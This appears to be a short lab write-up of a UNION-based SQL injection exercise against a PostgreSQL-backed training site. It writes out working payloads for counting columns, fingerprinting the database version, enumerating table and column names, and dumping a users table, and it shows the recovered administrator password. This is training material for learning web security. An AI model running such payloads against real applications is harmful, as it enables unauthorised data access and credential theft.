Lab #9 :- Sql injjection attack, listing the database contents on non-Oracle databases

End Goals: 
- Determine the table that contains usernames and passwords
- Determine the relevent columns
- Output the content of the table
- Login as the administrative user

Ananlysis:

1. Find the number of columns 
' order by 3-- -> Internal server error'
3 - 1 = 2

2. Find the data type of the columns
' UNION select 'a','a' --
-> both coloumn accept type text

3. Version of the database 
' UNION SELECT @@version, NULL -- -> not Microsoft'
' UNION SELECT version(), NULL -- -> 200 OK PostgreSQL 11.11 (Debian 11.11-1 pgdg90+1)

4. Output the list of table names in the database

' UNION SELECT * FROM information_schema.tables

' UNION SELECT table_name , NULL FROM information_schema.tables--

5. Output the column names of the table

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xacgsm' --


username_pxqwui
password_bfvoxs

6. Output the usernames and passwords

' UNION select username_pxqwui, password_bfvoxs from users_xacgsm --

administator
9g91jpytvv5c091xpjxc


